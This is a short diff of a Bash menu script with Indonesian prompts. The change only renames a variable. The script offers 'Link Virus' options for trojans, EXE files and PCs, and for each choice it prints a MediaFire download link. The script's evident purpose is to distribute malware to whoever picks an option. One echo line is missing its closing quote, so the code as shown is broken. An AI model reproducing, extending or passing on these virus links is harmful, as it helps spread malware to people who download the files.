@@ -23,23 +23,23 @@ echo $green "1). Link Virus TROJANS"
 echo $green "2). Link Virus EXE"
 echo $green "3). Link Virus PC"
 echo $black "====================================="
-read -p "Pilih Link Virusnya :" santuy
+read -p "Pilih Link Virusnya :" saha
 fi
-if [ $santuy = "1" ]
+if [ $saha = "1" ]
 then
 echo $yellow "Sedangg Menunggu....."
 echo $yellow "Sipp, Maaf Menunggu..."
 echo $yellow "Link : https://www.mediafire.com/file/btffebdhkry46s0"
 echo $yellow "Maaf, Telah Menunggu"
 fi
-if [ $santuy = "2" ]
+if [ $saha = "2" ]
 then
 echo $yellow "Sedang Menunggu....."
 echo $yellow "Sipp, Maaf Menunggu..."
 echo $yellow "Link : https://www.mediafire.com/file/kiwpmbv0cxsvqhu/
 echo $yellow "Maaf, Telah Menunggu"
 fi
-if [ $santuy = "3" ]
+if [ $saha = "3" ]
 then
 echo $yellow "Sedang, Menunggu......"
 echo $yellow "Sipp, Maaf Menunggu..."
